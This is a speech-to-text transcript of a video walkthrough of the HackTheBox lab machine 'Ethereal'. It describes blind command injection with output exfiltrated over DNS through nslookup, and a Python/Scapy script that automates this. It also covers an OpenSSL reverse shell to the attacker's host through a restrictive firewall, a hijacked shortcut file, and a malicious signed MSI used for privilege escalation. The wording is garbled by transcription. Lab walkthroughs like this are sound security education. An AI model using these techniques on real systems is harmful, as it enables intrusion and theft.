 what's going on YouTube this oops I can be doing a thrill from ACTA box and this box is incredibly challenging so apologies ahead of time for the lack of I guess quality I don't have as much time to prep through this box and well I'm gonna make mistakes left and right going through it and you'll see why I normally don't do like live streams of self in boxes just because it's so painful to watch I guess so the box itself it's tough you got a blind command injection that you got to get data back over DNS and then after that you have a super restrictive firewall that you have to use open open as Zelda get a shell and then once you get that shell you have to sign a MSI file a Windows installer drop in a directory and eventually gets executed and you get a system shell so that being said let's just jump on in as always we begin with the end maps are - SC for default scripts SV enumerate versions Oh a I'll put all formats put in the end that directory and call it ethreal and then the IP address which is 10 10 10 106 can take some every one so I've already run it looking at the results we have three ports open we have FTP on port 21 and and map is telling us anonymous FTP login is allowed but it's also telling us there's a weird error message saying can't get directory listing passive IP 170 216 249 135 is not the same as 10 10 10 106 so it looks like the ftp server just wasn't reconfigured after an IP change essentially this is error message is just saying hey the ftp server is telling us to connect back to it on this IP address and our computers kind of confused because we're like no we connected to your 110 10 10 106 while you're redirecting us here so FTP service just wasn't reconfigured that's how passive mode works so passive mode probably broken will have to default to active mode if we ever want to access this FTP server the next thing we see is iis httpd 10.0 on 480 this means it's going to be a Windows 2016 box and we don't see anything else really we also have looks like iis which is HTTP API HT PD 2.0 listening on port 8080 so we have two web interfaces and one FTP so the first thing I'm going to do is poke around at that FTP so FTP 10 10 10 106 don't say it was there we go we're doin anima s-- and the passwords gonna be anonymous as well that's just the default for anonymous FTP and we have Oh God a lot of files so if we go into binaries do a dir we got an MSI some executables new folder and stuff so let's just download all of this so to do that we're gonna be using W get with dash M damira and then we put the URL so FTP colon slash slash user name which is anonymous anonymous at the URL which is 10 10 10 106 we see it connect and then it stopped when it tries to switch to passive mode and if we remember we have passive misconfigured so we have to put the flag no passive FTP and it's logging in and then starts downloading all the files if you're wondering how I figured out that flag you just literally run a man on W get and search for passive and it tells you no passive FTP disables the use of passive FTP transfer so while we have that W get running let's go in and check out the web page so we'll get a 10 10 10 106 and 10-10-10 106 colon 80 80 80 80 immediately responds with a invalid hostname and 106 we have a web page so the first thing I'm going to do is look at the source code and see if I recognize anything we have Corp image SD logo aspx so I don't know what this is maybe it's DotNetNuke which is a CMS but generally if I see like WP - login I immediately know this is WordPress or I forget what joomla's is but just look at the URLs see the structure and see if we can identify what the underlying technology of the website is so let's go well again looking at register register at the bottom left we see it just goes to that hashtag signed a pound so that's nothing and we got menu we got the team that goes to the anchor zero services give us an actual page projects doesn't log in same page really went join in anchor 0 and admin go somewhere and all these social media things don't go anywhere so this assistance page looks interesting if we click get assistance we get a client ID email company message so we'll tell them to please subscribe to if SEC click Submit and doesn't really do anything so let's go again and put this in book just so we can see the requests so client ID [Music] it's that company or email apes a cat please subscribe me company website at the Boxee you message please subscribe damn SEC go over to burp suite and receptors on click Submit and we get a bunch of stuff so I'm just gonna send that over to repeater to take note of it and then let's move on so let's go over to the wall again we'll login with admin at task.com pass with a password click login we get failure if we go over to boot we didn't get anything we can try walking in again and man that swivel is annoying click well again failure but we get nothing so we could probably just search through boot let's see if we look at search by term failure we don't get anything let's enable everything matchings fail huh I'm surprised Boop doesn't find this let's go over this view the source and open these and see if we can find it real quick but because it's not sending anything to burp when we try to login I'm guessing it's just JavaScript that immediately says something so we can see and the CSS page the cascading style sheet we have content is equal to failure and form after so there's probably JavaScript somewhere that's going to call something that makes this element visible so I'm just gonna go and ignore this login page because unless there's hard-coded credentials it's does nothing so let's see we got the admin panel we get a menu let's check out notes messages desktop ping and we have intercept set to on so we can turn that off notes welcome Alan this your new console we look at the source don't really see anything we can try like index to dot HTML don't get anything we may want to run like dirt Buster or something in this notes directory to see if there's any other hidden notes the next thing we clicked on was messages which went to nowhere desktop we got something if we click on Chrome we get I hacked the box picture click on file explorer nothing or cycle bin nothing use it our text we have something looks like a troll page I can't click that X but if we click View image all we see is an image so this page looks like a VDI where we interact with it and we think we're in like a OS and a web browser but the way it's displaying content is very much just like a bunch of images so I'm gonna say this is a rabbit hole and ignore it and then the last thing was ping and that brought us to SPO HDB colon 8080 and we don't have that website and our host file so we don't know who this is but remember if we don't do if we just go to the IP on port 8080 we get invalid host name so what I'm going to do is go in my host file do 10 10 10 106 and put f3o htb now if we go there now colon 8080 and it's still waiting let's see interceptors off let's just disable or go there and it prompts us for using and password burp just has a cache DNS if I open burp again so if we close this and open it chances are it'll ask us for the password there so from this we have a few things we can do so the main thing we noted was hold on password and with burp now it asks what's password so to recap what we saw on this website we have this login that went nowhere the main things was services get assistance this sends data to the server and then we also found out the server's hostname is a 302 h TB and on port 8080 and asked for a username and password and we also know that there was an FTP server so I want to search through all the data that we downloaded from the FTP server and see if we can find some type of password so just stay organized W get name the directory 10 10 10 106 I'm just to FTP and let's grab - oh I password dot and don't see that much we do see the binary TrueCrypt 7.2 has the word password in it no duh and work at MSI I don't know what that is so let's go take a look at work at MSI instead of reversing it let's just see how old it is because sometimes MSI's will have hard-coded credentials in them if the organization themself had made the MSI so that's all we're trying to find out so I run an md5 sum on it and we'll go to virustotal and then we can use the search feature to search for a hash and virustotal finds this and it even finds that hash is related to Orkut MSI there's no viruses in it or coordinate virustotal if we go to details we can see that it's creation time was 2005 the file submission time the first submission time was 2007 so 12 years before the box is made chances are that MSI doesn't have any good data we have a chipset text we can look at it doesn't look interesting look at teamcity a bunch of XML doesn't look interesting and then we got those two zips disk one zip and fdisk got zip so let's make the zip and copy disk 1 and F disk and the reason why I'm just doing this outside of the FTP directory is if we want to include this in the report we don't want to modify any of the files so unzip F disk because now we could just go to FTP do find - LS and then put that in the report showing all the files we downloaded but anyways go to zip we got disk one just two and fdisk we can check like the disk size with tu we see the all one point five Meg's do md5sum we see they all different we can strings them all and that's odd we get right away password box so we started looking at the ftp server to see if we can find a password for a port 8080 and right away we see something called password box which looks like it is going to be a program and if we look at the facts we see it's some type of encrypted database and it's also open source so that's cool let's just try mounting these disks so if you look at mail we have nothing there so let's make the mount disc one disc 2f disc and batch will auto expand that and make this all three directories so now we can mount disc 1 to mount disc 1 2 2 2 and F disc 2 F disc so let's go and amount disc 1 and we just get routing information just to nothing interesting and fdisk there's that P box thing so password box and it's an executable we do LS - that way nothing there but we strings these let's go back to HT beatboxes ethreal and then zip strings star we know it is open source so I'm going to search password box github see if we can find it and then also SourceForge if you did a lot of research on this you notice it's a like DOS and Linux box program and if you installed DOS box on your Linux machine and downloaded a file you'd be able to get it working but I find it easier to just download the Linux version and run that because if you run it in DOSBox then you don't have like copy and paste and things like that so we got the zip let's move downloads key box unzip this shoot make the P box RM changes license P box dot PNG beat box text clean this up make directory B box and now we unzip it in this directory okay so if we run dot slash P box we get a error message saying cannot load Lib and curses so let's do app search web and curses and we want v because it was dot dot so we download this and with that package installed we should be able to execute it we can't let's do file against it it's 32-bit so we can install the 32-bit package of Lib curses so install that one did specify through bit I just did : I 386 and now when we execute password box it says a database will be stored at /root /p box Det so what we're gonna do is copy the P box start dat file on the share into root P box depth and now when we run P box it ask us for password so we've put a password in it will say rejected I'm gonna guess the password is password and get in so the password managers password was just password and that was a guess if you don't like guessing you could just reverse this and try to create a cracker for the hash I think it's a es encrypted there is the source code on SourceForge so if we do code you could download the source or you could also just modify the source code to not exit after every password and get rid of that sleeping for one second away and brute-force it that way and I think 0x DF will do it this way I think he created a brute force for this program but I just guessed password and we can navigate through this and get various passwords so what I'm going to do is quit out of this and password box also has a dash dash dumb so I'm going to enter my password of password and we dumped the database so let's not send an email copy the user pass text and would do databases MSDN see learning I'm not sure what this is I'll just say the users FTP there we got Alan just guessing what the username could be here and we'll make a username and password dictionary so say management and then subversion okay so we can do all F and then print one on user pass text get all the potential user names so it - you users got text and change this to print - and we'll call this pass dot text so now we've got two files user dot txt users dot txt and pass dot txt so we're going to feed these files into Hydra and try to get into that port 8080 because we just had HTTP off here so at 3:02 HDB port 8080 and we can use hydro try to brute force this to get the syntax I'm just going to do a Hydra dash H and we can see that - capital L is a username file so we'll do - capital L users text - P is the same for a password file and then we're going to specify HTTP at 3:02 HT b colon 8080 and there is no service HTTP most likely mean one of these many web modules so we'll do HTTP - get and we see you right away that Alan cracks are the brim for successful Alan and this long password so let's go and try this so if we'd go to ethical htb Alan paste this in sure we can save the password and we go to a page that says test connection so we'll test we'll just put jump but please subscribe and see what happens see if we see any error messages that indicate what this is says cannot reach a desired host and ping address so let's try one 27001 ping this and connection to host successful so let's do a TCP dump so we'll do if config tun zero to get our IP address and then do TCP dump I times 0 ICMP and I also want to do - end to not try DNS lookups so let's try doing 10 10 14 3 click go and we can see we get a few ping packets originating from the server so let's try - and one 10 10 14 3 to make this easy to see do this and we get just one ping packet if we do that again and do - and - 10 14 3 we get to ping packets so this is indication that we're injecting into the command so the command is probably like paying user input here and what we're doing is we ping use your input so we put that to be 10 10 14 3 and we can also put arguments so the question becomes can we do um nested commands put multiple commands in that so let's start TCP dump again and we'll do - and one ten ten fourteen three and then a and and ping - and one 10 10 14 3 so click go and we should see one ping and two pings so we have validated that we have command injection so we could try like - n11 27001 and and let's go to wall bins I forget the cert util syntax so wall bins so it util download so we can try this and put 10 10 14 3 we also want to listen on port 80 and let's just send this over to Brooke to make our lives easier for interacting with this I forgot to intercept it so we can go to history and send this to repeater but we see the server never connected back to us and we can play with them up a lot but we find out eventually it's the firewall that prevents it so we go to see if there's any way we can get the server to talk to us after a lot of playing around it turns out that you can do a DNS request out of this server so to do that I'm going to whoops do control shift you to on your El encode this and let's see if we can make this font any bigger let's do miscellaneous display sixteen burp has to be restarted what we had small fun until next video but anyways we got that one 27001 and end I'm going to replace this cert util that did not work with nslookup when you put anything here so we can put please subscribe and then the DNS server which is 10 10 14 3 that is us do control you and now we just have to do a TCP dump - I tun 0 V V V port thang 53 UDP I forget how to do this I hate syntax for TCP dump a tool called responder is known for listening for all DNS requests and forwarding poison requests so I'm just gonna use responder to see if we get any requests so send this request that's the command injection and ice lookup and we're sending please subscribe and responder does see that so we could also send like a command so we can do % username % and send the variable of username over to the server and we'll see we get s real so now I did a way to get some type of output of commands we run so what else can we do with this if we wanted to run an actual command it's gonna get a little bit dirty in this window let's just ctrl shift you let went WOD I was just looking at this weird character so the code inject so let's see so we have nslookup and we want to run a command so we validated we can look up variables so we got to find a way before nslookup to put the output of a command in a variable so we can do a four percent a and CM d /c will do dir I will do Who am I I'll just try to think of a simple command that doesn't have a lot of output and then do an S look up like this I think that's the correct syntax so we'll find out let's see if I did that correctly I really hate bad shifting oh we need do % a here so we'll do set a copy and paste and convert to URL click go look here and let's hope it responds to us CMD so it responded but not in the way we expected so let's see do we need /f there we go we got Ariel so I don't know where this see Who am I oh we get rid of all this click go there we go so we can do like dir I think /b is only going to output one column let's see what happens so now we're getting the output of dir very very slowly so I'm gonna go over and turn all my windows VM because how slow this output is it's really painful to do testing this way much better to just run the commands on Windows and see the output instantaneously and then push what you think is valid to the server so let's switch over to Windows so the main reason I wanted switch to Windows was to show the issue we're going to have so the command we sent to the server is this 4 /f percent a and dir /b do echo percent a this was an nslookup but we're just doing echo because it's easier so we see that just outputs all the directories one by one which is fine however if we don't have that /b it's only an output the very first column of output so if we want to get extra output we have to do like 4 /f tokens equals 1 2 3 and then dir a B C it's tokens goes before the variable so now we're getting more if we do 1 2 3 4 5 6 and then the variables will be ABCDE F now we can get output so now we know how to get output out of this command we can begin trying to script it so let's go back over to our Linux box and start creating a Python script to do this weird command injection and printing out the results over DNS so let's vf3 all dot pi and the very first thing we want to do is start off with Scapa so we can actually get the results of the output instead of writing this all from scratch let's go to Google and pull some skeleton code so we'll Google scabby thread Python and go to this first blog post it is by skype labs net or skip labs dotnet and we can copy this code set paste paste it in and go through it so the first line importing scatty which again is like a TCP dump for Python threading so we can put the listening process in the background which lets us do things while listening for packets let's see class threading a class sniffer as a thread interface we want ton zero run so sniff on interface tun zero all IP packets and for every packet do this print packet function print packet is going to do something and that's it so let's do Python 3 f3 hope I know module names copy so pip 3 and saw SCAP e and failed building but we have it just saying no directory license looks like it works let's go to burp click go are we going to print any packets we are printing packets so we should be fine I'm not sure what's wrong with Scotty there but oh well so let's go back into our code and what we want to do is print DNS packets only so we want to do an if if packet has layer DNS then if packet dot destination port is equal to 53 that means it's making a DNS request to us then we want to print packet so let's see what this does so python and valid syntax let's see i need to parentheses here so we started sniffing we can click go oh not sure when that happened there we go now we could go runtime error the application is not working so let's go back here ping - add one and then we want to do nslookup test 10/10 14 3 click go I'm not sure what's going on with this application so I may just have to revert the box ok that was good one 27001 nslookup test 10/10 14 3 go intercept is set to OFF ok loosely there arrow went away and we printed a few packets and we can see test is right there so we just got to figure out how to filter all this to only print test so let's open this back up and go back to Google and search for query name Scapa and the second result says DNS packet injector and if you're injecting packets you have to be able to detect packets so let's see what this is doing so has layer IP we already did that TCP or UDP has layered DNS DNS ID is packet ID QD and query name so we probably want to copy all these so DNS ID d NS q d and d NS q name ID we probably don't have to keep because we're not injecting packets back but query name we want so let's go back to a dude and say q name is equal to packet dot q DQ name and then since this place on three we have to decode this unless we're gonna get a bunch of like B's before we print I can actually show that okay so let's do Q type is equal to P Q DQ type and we can print queue name print queue type and pray we don't have a syntax error so execute this go here do nslookup and we see a reverse lookup then I look up and then test again so 12 is the query type for reverse lookup 1 is the query type for request and 28 is going to probably be the response so what we can do is do if Q type is equal to 1 then we print queue name so now when we run this oh you could also see there's B single quote so if we put this decode in now that'll go away so we can see it only responds with tests so we can begin now working on the other piece of the script and that is having the Python code actually do the code execution so we're going to need a few more modules so we'll do import requests and we also want to do something called beautifulsoup which is gonna make person HTML much easier because if we look at we have a lot of cookies to set once we log in we have this view state view state generator ----eventvalidation' search it's gonna make that easier so input that module and then we also will have to do the base64 HTTP authentication so from request dot off import HTTP basic pause okay and we need a from CMD import CMD so let's work with the command line first we do class terminal CMD prompt is equal to that and then def do CMD self hugs print bugs so we got the terminal there I don't know what this is let's see if we can just get rid of this and then do terminal is equal to terminal terminal dot command loop so now when we execute this it doesn't work let's do let's see sniffer command oh we need a function so now run this with Python three we get this so the terminal is there we can verify that while that works we can sniff so CMD test and CMD who am i and then we get the response test so that was the DNS requests coming as we're doing commands so all that works so now we just have to login to the website so let's do def an it self and CMD and it self self dot auth is equal to HTTP basic auth user name was Alan and the password do we have it here we can just hydrate it again here's the password so Alan this so we can print self dot off then print as we thought it would but that should be fine so the next thing we can do is page is equal to request dot get HTTP every--all dot HT b colon 8080 then auth is equal to self dot off and we can print page text let's see yep so we got the page and in order to do the submission we need to include all this information it acts like a cross-site request forgery kind of because if we just took let's just take the viewstate parameter out and see what happens so we take this out click go and it says nothing so need that in there for this to work and so redo I'm not sure where I screwed up now oh well anyways we have to take all these variables and put them in as parameters so that's where beautiful soups going to come in because it makes doing that really easy so we can do soup is equal to beautiful soup page text and we're going to pass it through the HTML parser and then self dot view state is equal to something self dot view state general a generator is equal to something self dot event validation and then self dot CTO to I guess so viewstate soup dot find input and then name viewstate and we want the value of that see that clears all those out yep so that's it that's all soup is doing you just need to know the magic syntax input name and all the pulling is if we take this out it's searching through here and pulling or his name pulling name viewstate name you state generator and the value came from here so name name view state view state so select maiya grabbin we're name is equal to view state generator grab value is essentially what we're doing so hopefully that makes sense this one will be few state generator i need put this in quotes value souped-up find input name is equal to this is ----eventvalidation' value and the last one is CTL and put name CTO to value so we can try printing all these so print cell vs print we'll just do to selfie V from this sponsor object has no text at line 1515 soup page dot text forgot the E and because that did not exist because it's CTL oh - yep let's see there we go so we printed both of them so now we have the log into the page done we can now do a command so let's just do default death default self hugs and this is going to be let's see CMD is equal to we you need to do that still data and now we just have to wrap all of these up so you state self dot vs then you state generator self dot vs g event validation self Evie and this will be C TLO to self dot CTL so that's done then we'll do request post HT ps3 old dot h TB 8080 data is equal to data off is equal to off and the last thing we need to do is the command so how do we send commands it's clear search and it's just above CTL so we can do search is equal to CMD so now we just have to have what a command is so F and that F is gonna make it so we can just do commands and brackets triple quotes because we'll probably get and go in and use a lot of quotes and triple quotes like I did print like that it would just print the double and single when you do triple it doesn't evaluate single a double doesn't evaluate there so you don't do worry about escaping a bunch of stuff so I like doing triple quotes around complex things so this and then we do 4 /f tokens equals 1 comma 2 comma 3 4 5 6 % % a and this will be CMD and I think we put this in single quotes or double quotes it probably doesn't matter do nslookup % a % b c d e f then 10 10 14 3 so I think that's right and of course it's not let's see f what did it say single is not allowed an extra character if I do Who am I CMD reference before assignment huh one of its just because it doesn't like that variable name command will do inject underscore command I guess oh shoot this is args and this can stay CMD there we go Who am I auth is not defined auth is equal to self dot off Who am I and we wait for the response and we get to and the reason why we're getting to is because we have responder off the server we actually got more than two but the server is send request knock in response and sending another one so I start up responder so we don't have to inject DNS packets back to respond so we can do now dir and see the output of this now I'm going to speed up the video whenever I do these commands because as you can see it takes like one to two seconds between lines which means this video would go really really long if we do not speed it up here so I'm actually going to just let this keep running because I'm tired of waiting and we're going to edit the script and if you noticed it's not really the easiest to read output there's no spaces or any things and it's just doing big DNS requests there's a number of characters that can be done in a single like I don't even know what it's called if we go to like admin dot actor box see you there's a certain number of characters that can be placed here and the way we're doing the request is we're just putting everything and one and we know that we kind of can loop by like spaces like this is percent a there's a percent B and there's percent C and they should all be different words so we could place items in between them and then we'll be able to grab the spaces so what we're going to do is edit the script again and this time we're going to change this tokens and we're going to do tokens and 1 to 26 that's gonna be for every letter in the alphabet and then we're going to do nslookup for q % a z period q % b z period and these are just characters that probably won't appear that frequently and the reason why we're doing this is then our script can just grab everything between capital Q and Z period and that will let us get the output be a little bit cleaner so I'm going to use bash to help me create this so we can do for I and a Z do echo I and that's going to print all the letters in the alphabet so we can do do echo q % dollar I Z dot did not work we have to put high in these brackets there we go and do a dash n so now we have 26 tokens so we can copy this paste it here and we're doing this because one of the commands we're about to run will require a lot of tokens and if I run it then the box is dead until like five or ten minutes I'm lazy so I'm just doing this ahead of time and hopefully it works the first time I run this command because if it doesn't it's a long wait so we got all that now we have to go back down to a sniffer and change how we're doing the printing because we can't just print queue name now because if we did that we get a whole bunch of mess we can try it and just do like a Who am I you can see what the output looks like and it won't be pretty so that's what the output looks like so now we got to just tell a Python script to grab everything in between so let's go back into Arial and we're going to print queue name dot replace I'm going to place every zq with a space and then we'll strip it because actually we won't strip it right away i can show you what happens so if we now execute this do Who am I we see a bunch of spaces here and then Z period because we're replacing ZQ so it doesn't replace this and it doesn't replace this queue so what we're going to do is remove the first character and the last two characters and then strip all the spaces at the end and then we'll get a much cleaner output so remove the first character and the last two and then do dot strip and now when we run this who am i and well good so now we can do like dir SC : which is hopefully going to be a smaller output than the last one and we should see what this looks like so that looks much more promising and now this output is looking like a traditional shell we're just extremely extremely slow there is the issue of every now and then there's just characters we can't put in a DNS host name like slashes so that's why we don't see it here but having this shell means we can actually do enumeration now and read the output so speeding up the video again getting rid of this and then we run a few commands that put in some pretty cool information the first command I generally run is set and this is going to print the entire environment variable and while that runs I know the dir see : showed this directory the reason why it didn't do C colon backslash is because we didn't put the backslash in it so yeah but this is printing the environment variable which kind of tells us what a running context is so we can see like all user profile things like that so speed this up again so we can get this out of the way so I think that's done printing the next command I do is like Who am I slash all and this is going to list all the privileges and tokens and whatnot so let this one run so we can see that our user is Alan there's probably supposed to be a backslash here but there isn't and a username up in the set was Ariel and that's because we have that se impersonate privilege and can most likely use run potato on the server once we get a shell so we are the system user but we're impersonating Alan or where Alan impersonating this I don't know which way it works but we can see we're Alan so let's go to dir C colon backslash users Alan desktop to see if he has any flag on his desktop so doing my dir there and you could also do dir C colon users and go in everyone's directory but I'm gonna start doing less commands than I expected just because I've killed like 10 minutes winning for all the output to go through this was the most painful part of the box so we see his desktop doesn't have the flag but it does have note - draft text so I'm going to do type to view the contents of this now we can see I've created a shortcut for a visual studio in the public desktop tensho we have the same version please delete any existing shortcuts and use this one we can also do commands like PowerShell who am I to see if PowerShell works but it doesn't I kind of skip that whole part once we got a command injection but there's a blocker on the system and that's why we didn't go for a reverse shell right away so if we do a dir SC : users public desktop we see there's a directory shortcuts so we do a dir in that we see it's just a shortcut to visual studio and we can run type against that put this in quotes Visual Studio 2017 lnk and see the contents or maybe we can't cuz there's a lot of bad characters but we have to figure a way to probably get on this box because based upon that note I'm guessing someone executes this shortcut so the first thing I did was start a new bring the firewall so I did net SH adv firewall firewall show rule name is equal to all direction is equal to L find string fresh C name and before I do this because it takes like 15 to 20 minutes probably to get all the output I am testing it on my box okay so that's what we want gonna run this and then again speed up the video for quite a while oh it did not run so let's go out of a shell and think if we can find why I'm just going to do CMD C I'm gonna replace these quotes with this and maybe just opening in a new command prompt gives it time to run or something so let's just see if that works copy paste and I think when I was doing the Box I found that out through trial and error by going through my windows box but now we are outputting rule names so we'll let this finish and see if there's any non default rules that help us and as we're going through didn't actually finish all the rules was that it I don't think I rant without put last time it took so much longer but we do have a few rules that are interesting UDP port 53 this is going to be for DNS requests ICMP requests and TCP port 73 and 136 the issue is we have to find a way to [Music] make a connection on one of those ports and to do that I went into Program Files and the easiest way to go into Program Files I do is Pro go one appropriate to maybe that got patched oh no CD backslash CD program one is going to be program files and then progra two is going to be Program Files x86 so that's short file name sfm I believe in Windows you can do more research on that but it just helps when there's weird characters like I hate putting parentheses and stuff and commands so let's do dir C colon backslash progra too and see what programs are installing this computer because we have to find a way to get connection back to us so now we're just hunting around for like netcat or something like that we can see that open SSL is installed on the computer and doing a search on like Lal bins we let's see is it here yep Lal bins if we look at like open SSL does this have anything no if we Google open SSL windows reverse shell we should find plenty of hits so let's see this one we generate the certificate this is a Linux one let's do this is on Walmart cheat sheet up Windows cheat sheets so let's see OpenSSL let's see one of these is going to be it windows key suit here we go so OpenSSL s client quiet Connect CMD and do it again and I think this side is standard in this side is standard out so let us actually I'm gonna do this in a new window because copying when it split vertically is a hassle so let's make the directory SSL make the directory that's just go in as to sell go in as a sell and we also we have to make the certificates first so open SSL request - x.509 new key or sa 4096 key out keyed up em - out certain days a year and then nodes do all the defaults here now we got certificates so we can do open SSL then it's do they have it here as server and I really don't like that quiet output it's not too noisy but it tells you when it connects so - key and that cert - port is what we need so key is going to be keyed up em sir we'll be sir tom port we said 73 on 136 so 73 136 so we're going to try to do actually before we do this says we're doing reverse shell we don't need this whole crazy syntax because we're not getting any output so when use this do command so 1 2 3 4 5 6 7 8 9 9 lines some do 9 double wide for yank and then we can p4 put and delete all this so - n1 1 27001 and any command we want so we wanted CM d /c eggs we can put that in double quotes so this command injection is just a lot cleaner than doing all this so it kind of limits the damage we can do what limits uh I guess I don't know what I was saying limits the weirdness because it's much more standard so now we go do the command so it's whoops C colon backslash progra to open SSL - V 1.10 I think that's what it was in SL v110 yep and then bin open SSL dot exe we can do s client - connect 10 1014 3.73 and before we do like a reverse shell or anything we can just make sure we connect so 73 we get a connection here so we're good go back here wait for us to get a command prompt back if not we'll just kill it just kill it so now we can do cmd.exe paste this again and do 136 so go open a Cell and I have no idea what it's printing but we get a shell I do dir maybe this is what I want quiet we get no output so let's do quiet here - qu IET go here and copy this V command just making sure there's copies on one line a lot of times when you copy and paste out of T MUX like that it copies the line breaks - between terminal lines ok connected and I don't know what all this is but we don't get any output and the reason for this is if we go back here if we do CMD /c c md and launches the CMD in that window if we use this command start it's gonna open a new window and that's gonna make all the difference right here i think because this whole thing is new to me so let's try this again with putting start before command we're on this and we can copy this paste and it's still going through oh I wonder if so this is standard in and this is standard out and whenever we connect it spewing all this stuff so I wonder if we do - quiet here on the standard inside and cat CMD copy this paste let me start it open as a cell and see there we go so now we have command shell we have standard in up here standard out down there so if we do CD users and CD public desktop shortcuts that's what it was we could type Visual Studio 2017 dot link and we can see the link goes to the D Drive and if we try to go to the D Drive we can't if we do I cackles on this link to look at the permissions we can see that everyone can modify them so if we do a dir we can let go hello to this and then dir we can see we have over wrote that link so we do have control of the link we just have to be able to copy a file to this server so easiest way to do that is through up in SSL so we can well before we do any opener cell we have to go back to Windows and create a malicious shortcut whoops let's do T MUX attached - tht be to attach again yeah we have to go to Windows to create a malicious shortcut so let's switch over to Windows so now that I'm on Windows I can just type PowerShell so we can create this shortcut we could do this through the GUI but I just like doing it through PowerShell because if we were on the target and it didn't have a blocker we would be able to just do this there so W script new object comm W script shell and now we get the comm mobs are created we can create the shortcut is equal to W script dot create shortcut please subscribe Ln K and we can do and just because we did create shortcut doesn't mean it created it it just created the object where we have all these variables so we can do shortcut dot let's see target path is equal to see : windows system32 cmd.exe let me do SC dot arguments is equal to c colon slash C and then we have to copy all this open SSL crap so go back to this box go here copy this paste we don't need CMD because that's our argument okay SC to print it we see the arguments we see the target path so we do SC dot save and now we do dir and we got that please subscribe link so to copy it on to a box let's create a directory called SM well we'll do it in the SSL directory because that's where a keys are and that's where open SSL is so impact it - SMB server - SMB to support call the share files and link it to a current directory before we do that we have to kill responder ok if config 0 Ã­m 10.1 90 so 172 1610 dot 190 put the shortcut here go back to the box and we want to do let's see CMD open SL connect port 73 and we want to direct that to C : users public desktop shortcuts and that's going to be please subscribe Ln K we want to get out of a open SSL shells and on port 73 we're sending please subscribe back through it hit enter give this a little bit we should see the output huh let's see if it transferred connect connect and do we have it here copy paste CD users public desktop shortcuts dir we have please subscribe Ln K there so we can type that and get it so what we have to do is copy this over copy please subscribe Ln K over top of Visual Studio 2017 dot Ln K and then immediately restored our shells because it's like on a five-second loop or something so we don't have much time to do this so copy copied sent and I showed on slash why cuz right as I closed it it said overwrite so send this again CD users public desktop shortcuts copy please to Visual Studio 2017 dot LMK yes copied start these back up and hopefully he clicks it if not we'll just send it back through and try again so let's try this again unfortunately you have to be extremely fast here and then once we do this we're gonna do something really cool and get a regular shell working we're gonna bypass a blocker so I don't know why I've tried to send it through again I didn't have to do that because we didn't remove it we just moved it or copied it okay CD users public desktop shortcuts and then copy /y please over top of Visual Studio 2017 LNK copied and I think I missed we see it came through on this one but not this one so try again this time we'll definitely get it CD users public desktop shortcuts copy /y please Visual Studio 2017 lnk ready go so we copied it over top didn't make a typo and I'm not getting Michelle this is getting frustrating I wonder if I created that shortcut wrong at this point so we do this one more time and then we just gonna do AppLocker bypass because I don't like this so copy please subscribe dot LNK oh we don't have to be short I'm being a stupid so we can listen on these ports and I can just use this so we can do CMD copy /y c colon users public desktop shortcuts please subscribe Oh shortcuts yeah please subscribe LM k over the top of copy this paste go over here copy paste there we go that's part of the way we're supposed to do it give this a few seconds and hopefully a copies over there we go that's how you're supposed to do it so now we're on George if we go CD dot dot CD desktop we'd have user dot txt so if you remembered back in the beginning there was a D Drive we nampyk mission two so I'm going to try going to D that was the where Visual Studio is installed and now we can get to it there's a few directories so it's dev program files and program data if we go into certs we have my CA sir and my CA pvk and if we go into dev we have MSI's if we look at note text it says please drop ms is that need testing into this folder i will review regularly certs have been added to the store already so based upon that note it sounds like we have to create a malicious MSI which is a Windows installer and sign it with these certificates that are in the search directory so let's do that so go up to directories go into certs and I think we do open SSL - in code is this a thing open SSL base64 encode my CA dot cir open SSL base64 in my see a dot sir uh-oh C colon backslash progra - I should really update my path there's v1 really sucks not having error messages base64 and my see a dot C here there we go so we got the first strip so we can see D will make the SMB be my see a dot C or B 64 paste base64 - D dot C or okay and we can do the next one which is my c AP VK it's a bit bigger copy v my CA dot p VK phase 64 - d ok so now we've got those two shirts we have to create a malicious MSI package so let's go over back to Windows and we have to download install Wix which is going to allow us to create MSI's and we also have to download the Windows 10 SDK which will allow us to sign this so if we download Wix let's do Wix binaries save and Windows 10 SDK so we can download the Installer save you downloads still downloading Wix or scanning Wix you must install the Windows software development kit before you can install the latest so we probably already have the SDK installed on this machine so I gotta find make cert which stands for make certificate we can open Wix and copy this to a folder select everything copy it in here okay and then if we googled around for like it's creating a malicious MSI file we'd come across an article by XP n SEC so let's see here we go and this has a good template so if we copy his Wix go into Wix No just do notepad paste so he's running PowerShell and we don't want to do that we want to do CMD /c hold on there's a few things here so property ID CMD line exec command CMD line so I think that's a variable to this so let's test this with echo cm be /c echo to test to see : users ape SEC f3 ol test so let's just save that like this C : users upset desktop wix dot test dot wicks I guess we'll do save and now we have to execute the wicks so does he have instructions to do that here let's see candle exe dot wicks and then light so CMD CD desktop CD wicks well we can probably just do quick slash candle test and then light test dot wicks object wick slash flight test wicks object cannot find the file example dot exe so I'm guessing he was embedding example exe somewhere example exe source let's see I'm going to take this out save wicks light we do dir we have test MSI on our desktop so if I run this the question is does the directory get created that we put here test death real test C : users hip sack from this MSI and we see the command gets executed so we should be good to create this with the OpenSSL so go back to a box and let's see where was your show last open us so do we have CMD dot exe here we go so go back here oh really is my clip we're deciding not to work see DSMB the test txt paste went and Dev and we can go to we have to start a file share backup takes a second startup should be up there we go I don't see test.txt where did I put that it's an SMB not SSL sure just copied it okay there we go test dot txt finally copy this paste save escape we should be able to candle and then wicks light test that wicks object create that MSI and then we have to save it so let's go where make sure it is installed to open file location' so we have make cert will also need pv k 2 p FX and sine tool okay we got everything we want in our directory so HECO path I'm going to set path is equal to this : path so now I can just as a cute sign tool awesome so we have to copy the two suits on to a desktop and now we can do make sure okay we do have oh what the heck version I make so it's not compatible really that's a load of crap see is this one this one is ok so that's one we want copy put the path a notepad in case this goes away open a new command prompt so I can set my path again set path is equal to this get rid of these quotes and we can do makes it there we go okay makes it - and this will be for what we want to call it so CN is ethereal then we want to do - PE this makes the SIRT exportable - cy is an end entity if you want to go for any of these arguments you need to make cert man page and see what all these flags are so and I see my CA cert IV my CA PBK sky signature s v f3 'l will call this please subscribe please subscribe dot p VK please subscribe see what did I screw up make shirt - n CN f3 ol p e cy o we want I see before my CA that's issue assert Authority or something there we go no password okay yes do it without password protection succeeded so now we should have the please subscribe shirts so now we can do p BK to the FX - please subscribe dot b BK then SP see this will be the cert 1 and then create the pv p FX file please subscribe D FX and this let's assign it so we can do sign tool sign / v f please subscribe pfx to the msi okay the MSI has been signed so we can copy the msi back on the box and test the cell so hopefully this all works if not well it's easy to sign the MSI's now so we just to play with that one command so we 